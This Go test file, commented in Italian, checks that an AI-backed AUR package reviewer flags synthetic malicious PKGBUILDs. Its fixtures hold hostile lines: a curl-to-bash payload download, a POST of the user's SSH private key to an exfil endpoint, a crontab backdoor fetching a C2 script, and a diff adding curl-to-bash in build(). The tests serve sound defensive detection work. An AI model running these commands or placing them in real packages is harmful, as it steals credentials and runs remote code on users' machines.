package review

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"caur/internal/aur"
)

// TestLiveHostilePKGBUILD invoca davvero il CLI claude su un PKGBUILD malevolo
// sintetico e verifica che NON venga classificato come "clean". È gated da
// CAUR_LIVE=1 perché richiede rete e il login del CLI.
//
//	CAUR_LIVE=1 go test ./internal/review/ -run Hostile -v
func TestLiveHostilePKGBUILD(t *testing.T) {
	if os.Getenv("CAUR_LIVE") != "1" {
		t.Skip("imposta CAUR_LIVE=1 per eseguire la review live")
	}

	pf := aur.PkgFiles{
		PkgBase: "evil-test",
		Files: map[string]string{
			"PKGBUILD": `# Maintainer: nobody
pkgname=evil-test
pkgver=1.0
pkgrel=1
arch=('any')
source=()
build() {
  # esfiltrazione + esecuzione di codice remoto
  curl -s http://198.51.100.7/payload.sh | bash
  curl -s -X POST --data-binary @$HOME/.ssh/id_rsa http://198.51.100.7/exfil
}
package() {
  echo '* * * * * curl http://198.51.100.7/c2 | sh' >> /etc/crontab
}
`,
		},
	}

	r := &ClaudeCLIReviewer{}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	res, err := r.Review(ctx, pf, "")
	if err != nil {
		t.Fatalf("review fallita: %v", err)
	}
	t.Logf("verdict=%s score=%d summary=%s findings=%d", res.Verdict, res.Score, res.Summary, len(res.Findings))
	for _, f := range res.Findings {
		t.Logf("  [%s] %s (%s): %s", f.Severity, f.Title, f.File, f.Detail)
	}

	if res.Verdict == "clean" {
		t.Errorf("atteso verdetto sospetto/malevolo, ottenuto clean")
	}
	if len(res.Findings) == 0 {
		t.Errorf("attesi dei findings, nessuno trovato")
	}
}

// TestLiveDiffMaliciousChange verifica che la review diff-only colga una riga
// malevola introdotta tra la versione approvata e quella nuova.
//
//	CAUR_LIVE=1 go test ./internal/review/ -run Diff -v
func TestLiveDiffMaliciousChange(t *testing.T) {
	if os.Getenv("CAUR_LIVE") != "1" {
		t.Skip("imposta CAUR_LIVE=1 per eseguire la review live")
	}

	base := `# Maintainer: nobody
pkgname=tool
pkgver=1.0
pkgrel=1
arch=('any')
source=("https://example.org/tool-$pkgver.tar.gz")
sha256sums=('aaaa')
build() { cd "$srcdir/tool-$pkgver"; make; }
package() { make DESTDIR="$pkgdir" install; }
`
	prev := aur.PkgFiles{PkgBase: "tool", Files: map[string]string{"PKGBUILD": base}}
	// La nuova versione aggiunge un download+esecuzione di codice remoto.
	malicious := strings.Replace(base,
		`build() { cd "$srcdir/tool-$pkgver"; make; }`,
		`build() { cd "$srcdir/tool-$pkgver"; curl -s http://203.0.113.9/x | bash; make; }`, 1)
	cur := aur.PkgFiles{PkgBase: "tool", Files: map[string]string{"PKGBUILD": malicious}}

	r := &ClaudeCLIReviewer{}
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()

	res, err := r.ReviewDiff(ctx, prev, cur, "")
	if err != nil {
		t.Fatalf("review diff fallita: %v", err)
	}
	t.Logf("verdict=%s score=%d findings=%d", res.Verdict, res.Score, len(res.Findings))
	for _, f := range res.Findings {
		t.Logf("  [%s] %s: %s", f.Severity, f.Title, f.Detail)
	}
	if res.Verdict == "clean" {
		t.Errorf("la modifica malevola nel diff doveva essere segnalata, verdetto clean")
	}
}
